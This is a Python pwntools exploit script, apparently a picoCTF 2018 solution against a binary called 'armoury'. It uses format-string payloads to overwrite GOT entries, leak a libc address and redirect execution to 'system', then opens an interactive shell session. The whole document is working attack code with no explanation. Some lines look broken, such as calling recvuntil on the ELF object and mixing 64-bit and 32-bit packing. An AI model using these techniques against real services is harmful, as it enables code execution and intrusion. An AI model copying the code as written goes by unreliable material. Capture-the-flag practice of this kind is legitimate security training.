from pwn import *
import binascii
import re

e = remote('2018shell.picoctf.com', 37402)
b = ELF('./armoury')
log.info(b.symbols['vuln'])
log.info((b.symbols['vuln'] & 0x0000FFFF) - 8)
log.info((b.symbols['vuln'] >> 16))
log.info(b.symbols['got.puts'])

b.recvuntil('Enter the name of Rifle to get info:')

payload = ""
payload += p64(0x0804a01e)
payload += p32(0x0804a01c)
payload += '%2044x'
payload += '%7$hn'
payload += '%32167x'
payload += '%8$hn'
#log.info(payload)
e.sendline(payload)
#log.info(e.recvall())
log.info(e.recvuntil('input your message:'))
payload = ""
payload += p32(0x0804a020)
payload += '.%7$s.'
e.sendline(payload)
info = e.recvuntil('input your message:')
system = hex(unpack(info.split(".")[1][:4], 32, endian='little'))
log.info(system)
payload = ""
payload += p32(0x0804a010)
payload += p32(0x0804a012)
payload += '%{}x'.format(int(system[6:10], 16)-8)
payload += '%7$hn'
payload += '%{}x'.format(int(system[2:6],16)-int(system[6:10],16))
payload += '%8$hn'
log.info(payload)

e.sendline(payload)
e.interactive()

#e.interactive()
